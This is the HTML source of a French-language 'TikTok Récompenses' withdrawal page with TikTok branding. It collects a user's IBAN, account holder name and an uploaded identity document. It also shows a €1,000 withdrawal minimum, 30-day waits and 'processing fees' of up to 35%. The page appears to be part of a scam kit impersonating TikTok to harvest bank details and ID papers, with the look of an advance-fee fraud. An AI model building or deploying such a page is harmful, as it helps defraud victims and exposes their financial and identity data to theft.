<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Retrait - Récompenses TikTok</title>
    <link rel="stylesheet" href="assets/css/home.css?v=2">
    <link rel="stylesheet" href="assets/css/saque.css?v=2">
<script type="text/javascript">
    (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
    })(window, document, "clarity", "script", "w40soemo0v");
</script>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="header-content">
            <div class="header-logo">
                <div class="logo-icon-container">
                    <div class="logo-icon">
                        <svg class="logo-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-2.88 2.5 2.89 2.89 0 0 1-2.89-2.89 2.89 2.89 0 0 1 2.89-2.89c.28 0 .54.04.79.1v-3.5a6.37 6.37 0 0 0-.79-.05A6.34 6.34 0 0 0 3.15 15a6.34 6.34 0 0 0 6.34 6.34 6.34 6.34 0 0 0 6.34-6.34V8.71a8.21 8.21 0 0 0 4.76 1.52v-3.4a4.85 4.85 0 0 1-1-.14z"></path>
                        </svg>
                    </div>
                    <div class="logo-pulse"></div>
                </div>
                <div class="logo-text">
                    <span class="logo-title">TikTok</span>
                    <span class="logo-subtitle">Récompenses</span>
                </div>
            </div>
            <div class="header-right">
                <div class="level-badge" id="levelBadge">
                    <span class="level-icon" id="levelIcon"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></span>
                    <span class="level-name" id="levelName">Débutant</span>
                </div>
                <div class="header-balance">
                    <span class="balance-text">€ <span id="balance">0.00</span></span>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content saque-content">
        <h1 class="saque-title">Retrait</h1>

        <!-- Withdraw Status (cooldown) -->
        <div class="withdraw-status-card" id="withdrawStatusCard" style="display:none;">
            <div class="status-icon" id="statusIcon"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#FE2C55" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
            <h3 class="status-title" id="statusTitle"></h3>
            <p class="status-text" id="statusText"></p>
            <div class="status-progress" id="statusProgress">
                <div class="status-progress-fill" id="statusProgressFill"></div>
            </div>
            <div class="status-steps" id="statusSteps"></div>
            <!-- Upload ID button (verification phase) -->
            <div id="uploadIdSection" style="display:none;">
                <label class="upload-id-btn" id="uploadIdBtn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                    Télécharger une pièce d&#039;identité                    <input type="file" id="idFileInput" accept="image/*,.pdf" style="display:none;">
                </label>
                <p class="upload-hint" id="uploadHint"></p>
            </div>
        </div>

        <!-- Fee Schedule -->
        <div class="fee-schedule-card" id="feeScheduleCard">
            <h3 class="fee-title">Barème des frais</h3>
            <p class="fee-current" id="feeCurrentInfo"></p>
            <div class="fee-table">
                <div class="fee-row fee-row-header">
                    <span><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></span>
                    <span>%</span>
                </div>
                <div class="fee-row" id="feeRow0">
                    <span>0-30</span>
                    <span class="fee-blocked"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></span>
                </div>
                <div class="fee-row" id="feeRow1">
                    <span>31-60</span>
                    <span>35%</span>
                </div>
                <div class="fee-row" id="feeRow2">
                    <span>61-90</span>
                    <span>25%</span>
                </div>
                <div class="fee-row" id="feeRow3">
                    <span>91-120</span>
                    <span>15%</span>
                </div>
                <div class="fee-row" id="feeRow4">
                    <span>121-180</span>
                    <span>10%</span>
                </div>
                <div class="fee-row" id="feeRow5">
                    <span>180+</span>
                    <span>5%</span>
                </div>
            </div>
        </div>

        <!-- SEPA Logo -->
        <div class="mbway-container" id="sepaBtn">
            <div style="display:flex;align-items:center;gap:10px;padding:10px;">
                <svg viewBox="0 0 24 24" width="40" height="40" fill="none" stroke="#003876" stroke-width="1.5">
                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
                    <line x1="1" y1="10" x2="23" y2="10"/>
                    <line x1="6" y1="15" x2="10" y2="15"/>
                    <line x1="14" y1="15" x2="18" y2="15"/>
                </svg>
                <span style="font-weight:700;color:#003876;font-size:16px;">Virement Bancaire (SEPA)</span>
            </div>
        </div>

        <!-- Saldo -->
        <div class="balance-card">
            <p class="balance-label">Solde disponible</p>
            <p class="balance-value">€ <span id="availableBalance">0.00</span></p>
            <div class="net-amount-row" id="netAmountRow" style="display:none;">
                <span class="net-label">Montant net après frais:</span>
                <span class="net-value" id="netAmountValue">€ 0.00</span>
            </div>
        </div>

        <!-- Formulário de Levantamento -->
        <form class="withdraw-form" id="withdrawForm">
            <div class="form-group">
                <label for="ibanInput">IBAN</label>
                <input type="text" id="ibanInput" placeholder="FR76 XXXX XXXX XXXX XXXX XXXX XXX" maxlength="34" required style="text-transform:uppercase;">
            </div>

            <div class="form-group">
                <label for="holderInput">Titulaire du compte</label>
                <input type="text" id="holderInput" placeholder="Nom complet" required>
            </div>

            <div class="form-group">
                <label for="withdrawAmount">Montant du retrait (€)</label>
                <input type="number" id="withdrawAmount" placeholder="0.00" step="0.01" min="1000" required>
                <p class="min-amount">Minimum : €1 000,00</p>
            </div>

            <div class="fee-info-row" id="feeInfoRow" style="display:none;">
                <span class="fee-info-label">Frais de traitement:</span>
                <span class="fee-info-value" id="feeInfoValue"></span>
            </div>

            <button type="submit" class="submit-button" id="submitBtn">Demander le Retrait</button>
        </form>
    </main>

    <!-- Popup -->
    <div class="popup-overlay" id="popupOverlay">
        <div class="popup">
            <div class="popup-icon" id="popupIcon"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg></div>
            <h2 class="popup-title" id="popupTitle">Retrait demandé avec succès !</h2>
            <p class="popup-message show" id="popupMessage"></p>
            <p class="popup-submessage" id="popupSubmessage">Votre demande de retrait sera analysée dans un délai de 30 jours. Après approbation, le paiement sera traité par virement SEPA et vous recevrez le montant dans un délai supplémentaire de 30 jours.</p>
            <button class="popup-close" id="popupClose">OK</button>
        </div>
    </div>

    <!-- Bottom Navigation -->
    <nav class="bottom-nav">
        <a href="faq.php?pais=FR" class="nav-item" id="navFaq">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"/>
                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
                <line x1="12" y1="17" x2="12.01" y2="17"/>
            </svg>
            <span>FAQ</span>
        </a>
        <a href="home.php?pais=FR" class="nav-item" id="navHome">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
                <polyline points="9 22 9 12 15 12 15 22"/>
            </svg>
            <span>Accueil</span>
        </a>
        <a href="referral.php?pais=FR" class="nav-item" id="navReferral">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
                <circle cx="9" cy="7" r="4"/>
                <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
                <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
            </svg>
            <span>Inviter des Amis</span>
        </a>
        <a href="saque.php?pais=FR" class="nav-item active" id="navWithdraw">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="1" y="3" width="22" height="18" rx="2" ry="2"/>
                <line x1="1" y1="10" x2="23" y2="10"/>
            </svg>
            <span>Retrait</span>
        </a>
    </nav>

    <script>
    var COUNTRY = 'FR';
    var IBAN_PREFIX = 'FR';
    var T = {
        withdraw_success: "Retrait demand\u00e9 avec succ\u00e8s !",
        error: "Erreur",
        fill_fields: "Veuillez remplir tous les champs",
        invalid_iban: "Veuillez entrer un IBAN valide commen\u00e7ant par FR",
        min_withdraw: "Le montant minimum de retrait est de \u20ac1 000,00",
        insufficient: "Solde insuffisant",
        days_30: "Vous ne pouvez effectuer des retraits qu'apr\u00e8s 30 jours d'inscription. Il reste %d jour%s.",
        withdraw_to: "Retrait de \u20ac%s vers IBAN %s",
        processing: "Traitement en cours...",
        submit_withdraw: "Demander le Retrait",
        // Novos
        withdraw_fee_label: "Frais de traitement",
        withdraw_fee_info: "Les frais diminuent avec le temps. Actuellement : %s%%",
        withdraw_net: "Montant net apr\u00e8s frais",
        withdraw_cooldown_processing: "Votre retrait est en cours de traitement (3-5 jours ouvrables)",
        withdraw_cooldown_verification: "V\u00e9rification d'identit\u00e9 requise",
        withdraw_cooldown_verification_text: "Pour des raisons de s\u00e9curit\u00e9, veuillez soumettre une pi\u00e8ce d'identit\u00e9.",
        withdraw_cooldown_analysis: "En cours d'analyse par l'\u00e9quipe de conformit\u00e9",
        withdraw_cooldown_analysis_text: "Votre document est en cours de v\u00e9rification. D\u00e9lai estim\u00e9 : 7-14 jours ouvrables.",
        withdraw_status: "Statut du retrait",
        // Níveis
        level_names: ["D\u00e9butant", "Bronze", "Argent", "Or", "Diamant", "\u00c9lite"]
    };
    </script>
    <script src="assets/js/saque.js?v=2"></script>
</body>
</html>
